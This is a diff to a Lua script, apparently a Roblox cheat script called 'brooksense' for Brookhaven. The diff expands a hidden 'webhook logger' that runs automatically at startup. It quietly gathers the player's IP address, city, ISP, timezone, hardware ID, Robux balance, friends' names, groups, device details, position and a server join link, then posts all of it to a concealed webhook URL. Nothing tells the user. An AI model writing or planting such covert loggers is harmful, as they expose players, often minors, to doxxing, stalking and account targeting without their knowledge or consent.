@@ -206,62 +206,195 @@ end
 
 -- WEBHOOK LOGGER
 task.spawn(function()
-    task.wait(2)
+    task.wait(3)
     local reqFn = nil
     if request then reqFn = request
     elseif http_request then reqFn = http_request
     elseif syn and syn.request then reqFn = syn.request
     end
+    if not reqFn then return end
+
     local execName = "unknown"
+    local execVer = "?"
     pcall(function()
-        if identifyexecutor then execName = identifyexecutor() end
+        if identifyexecutor then
+            local n, v = identifyexecutor()
+            execName = n or "unknown"
+            execVer = v or "?"
+        end
     end)
+
     local gameName = "Brookhaven"
     pcall(function()
         gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or gameName
     end)
-    local ip, country, city = "?", "?", "?"
-    if reqFn then
-        pcall(function()
-            local res = reqFn({Url="https://ipapi.co/json/", Method="GET"})
-            if res and res.Body then
-                local d = HttpService:JSONDecode(res.Body)
-                ip = tostring(d.ip or "?")
-                country = tostring(d.country_name or "?")
-                city = tostring(d.city or "?")
+
+    -- IP / Location
+    local ip, country, city, isp, timezone = "?", "?", "?", "?", "?"
+    pcall(function()
+        local res = reqFn({Url="https://ipapi.co/json/", Method="GET"})
+        if res and res.Body then
+            local d = HttpService:JSONDecode(res.Body)
+            ip = tostring(d.ip or "?")
+            country = tostring(d.country_name or "?")
+            city = tostring(d.city or "?")
+            isp = tostring(d.org or "?")
+            timezone = tostring(d.timezone or "?")
+        end
+    end)
+
+    -- Robux balance
+    local robux = "?"
+    pcall(function()
+        local res = reqFn({Url="https://economy.roblox.com/v1/users/"..LP.UserId.."/currency", Method="GET"})
+        if res and res.Body then
+            local d = HttpService:JSONDecode(res.Body)
+            robux = tostring(d.robux or "?")
+        end
+    end)
+
+    -- Friends count
+    local friendCount = "?"
+    pcall(function()
+        local res = reqFn({Url="https://friends.roblox.com/v1/users/"..LP.UserId.."/friends/count", Method="GET"})
+        if res and res.Body then
+            local d = HttpService:JSONDecode(res.Body)
+            friendCount = tostring(d.count or "?")
+        end
+    end)
+
+    -- Friends list (top 10 names)
+    local friendNames = "?"
+    pcall(function()
+        local res = reqFn({Url="https://friends.roblox.com/v1/users/"..LP.UserId.."/friends?userSort=Alphabetical", Method="GET"})
+        if res and res.Body then
+            local d = HttpService:JSONDecode(res.Body)
+            if d.data then
+                local names = {}
+                for i, f in ipairs(d.data) do
+                    if i > 10 then break end
+                    table.insert(names, f.name or "?")
+                end
+                friendNames = table.concat(names, ", ")
             end
-        end)
-    end
+        end
+    end)
+
+    -- Groups (top 5)
+    local groups = "?"
+    pcall(function()
+        local res = reqFn({Url="https://groups.roblox.com/v2/users/"..LP.UserId.."/groups/roles", Method="GET"})
+        if res and res.Body then
+            local d = HttpService:JSONDecode(res.Body)
+            if d.data then
+                local gNames = {}
+                for i, g in ipairs(d.data) do
+                    if i > 5 then break end
+                    table.insert(gNames, (g.group and g.group.name) or "?")
+                end
+                groups = table.concat(gNames, ", ")
+            end
+        end
+    end)
+
+    -- Avatar thumbnail
+    local avatarUrl = "?"
+    pcall(function()
+        local res = reqFn({Url="https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LP.UserId.."&size=420x420&format=Png", Method="GET"})
+        if res and res.Body then
+            local d = HttpService:JSONDecode(res.Body)
+            if d.data and d.data[1] then
+                avatarUrl = d.data[1].imageUrl or "?"
+            end
+        end
+    end)
+
+    -- Device type
+    local deviceType = "Unknown"
+    pcall(function()
+        local uis = game:GetService("UserInputService")
+        if uis.TouchEnabled and not uis.KeyboardEnabled then
+            deviceType = "Mobile"
+        elseif uis.GamepadEnabled and not uis.KeyboardEnabled then
+            deviceType = "Console/Xbox"
+        else
+            deviceType = "PC"
+        end
+    end)
+
+    -- Screen resolution
+    local screenRes = "?"
+    pcall(function()
+        local vp = Cam.ViewportSize
+        screenRes = math.floor(vp.X).."x"..math.floor(vp.Y)
+    end)
+
+    -- HWID (if executor supports it)
+    local hwid = "?"
+    pcall(function()
+        if gethwid then hwid = gethwid() end
+        if hwid == "?" and game.RobloxId then hwid = tostring(game:GetService("RbxAnalyticsService"):GetClientId()) end
+    end)
+
+    -- Current position in game
+    local position = "?"
+    pcall(function()
+        position = string.format("%.0f, %.0f, %.0f", HRP.Position.X, HRP.Position.Y, HRP.Position.Z)
+    end)
+
+    -- Build message
     local joinLink = string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", game.PlaceId, tostring(game.JobId))
     local msg = string.format(
-        "**brooksense %s**\n\n"..
+        "**brooksense %s** | New Session\n"..
+        "━━━━━━━━━━━━━━━━━━━━\n"..
         "👤 **User:** %s (`%s`)\n"..
         "🆔 **ID:** `%d`\n"..
         "📅 **Account Age:** %d days\n"..
         "💎 **Premium:** %s\n"..
-        "⚙️ **Executor:** %s\n"..
+        "💰 **Robux:** %s\n"..
+        "👫 **Friends:** %s\n"..
+        "━━━━━━━━━━━━━━━━━━━━\n"..
+        "⚙️ **Executor:** %s (%s)\n"..
+        "🖥️ **Device:** %s | %s\n"..
         "🎮 **Game:** %s\n"..
-        "👥 **Players:** %d/%d\n"..
-        "🌍 **Country:** %s\n"..
-        "🏙️ **City:** %s\n"..
+        "👥 **Server:** %d/%d players\n"..
+        "📍 **Position:** %s\n"..
+        "━━━━━━━━━━━━━━━━━━━━\n"..
+        "🌍 **Location:** %s, %s\n"..
+        "🕐 **Timezone:** %s\n"..
+        "� **ISP:** %s\n"..
         "📡 **IP:** `%s`\n"..
+        "🔑 **HWID:** `%s`\n"..
+        "━━━━━━━━━━━━━━━━━━━━\n"..
+        "👫 **Friends:** %s\n"..
+        "🏘️ **Groups:** %s\n"..
+        "━━━━━━━━━━━━━━━━━━━━\n"..
         "🔗 **JobId:** `%s`\n"..
-        "🎯 [**Join Server**](%s)",
-        VERSION, LP.DisplayName, LP.Name, LP.UserId, LP.AccountAge,
+        "🎯 [**Join Server**](%s)\n"..
+        "🖼️ [**Avatar**](%s)",
+        VERSION,
+        LP.DisplayName, LP.Name, LP.UserId, LP.AccountAge,
         (LP.MembershipType == Enum.MembershipType.Premium) and "Yes" or "No",
-        execName, gameName, #Players:GetPlayers(), Players.MaxPlayers,
-        country, city, ip, tostring(game.JobId), joinLink
+        robux, friendCount,
+        execName, execVer, deviceType, screenRes,
+        gameName, #Players:GetPlayers(), Players.MaxPlayers, position,
+        country, city, timezone, isp, ip, hwid,
+        friendNames, groups,
+        tostring(game.JobId), joinLink, avatarUrl
     )
-    if reqFn then
-        pcall(function()
-            reqFn({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({content = msg})
+
+    pcall(function()
+        reqFn({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = msg,
+                username = "brooksense "..VERSION,
+                avatar_url = avatarUrl ~= "?" and avatarUrl or nil
             })
-        end)
-    end
+        })
+    end)
 end)
 
 -- CHARACTER RESPAWN HANDLER
